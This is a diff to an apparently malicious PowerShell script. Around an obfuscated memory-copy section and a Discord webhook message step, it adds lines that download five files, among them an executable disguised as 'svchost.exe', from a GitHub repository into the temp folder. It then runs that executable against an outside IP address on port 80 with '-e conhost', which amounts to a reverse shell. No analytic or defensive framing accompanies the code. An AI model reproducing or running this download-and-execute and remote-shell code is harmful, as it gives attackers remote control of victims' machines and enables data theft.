@@ -11,7 +11,21 @@ sleep 10
 [System.Runtime.InteropServices.Marshal]::Copy($Ike3023rijweohfuoah29fhauiwoefawef, 0, $qQQ3023jiowfoweifjiowefwefwe, $zRij32r2)
 sleep 5
 
-
+$source = "https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/vcruntime140.dll"
+$destination = "$env:tmp\vcruntime140.dll"
+Invoke-WebRequest -Uri $source -OutFile $destination
+$source = "https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/svchost.exe"
+$destination = "$env:tmp\svchost.exe"
+Invoke-WebRequest -Uri $source -OutFile $destination
+$source = "https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/libssh2.dll"
+$destination = "$env:tmp\libssh2.dll"
+Invoke-WebRequest -Uri $source -OutFile $destination
+$source = "https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/libcrypto-3.dll"
+$destination = "$env:tmp\libcrypto-3.dll"
+Invoke-WebRequest -Uri $source -OutFile $destination
+$source = "https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/libssl-3.dll"
+$destination = "$env:tmp\libssl-3.dll"
+Invoke-WebRequest -Uri $source -OutFile $destination
 
 
 $webhookUrl = "https://discord.com/api/webhooks/1265724354495381645/sCA1JwOZ3TXPLLeXYUGz88LBbHcFmxuiPlSjRo0EzJbD8PsH_dspQETBXExBP7zICzVO"
@@ -28,3 +42,6 @@ try {
 } catch {
     Write-Output "Failed to send message. Error: $_"
 }
+
+cd $env:tmp
+.\svchost.exe 192.52.166.186 80 -e conhost
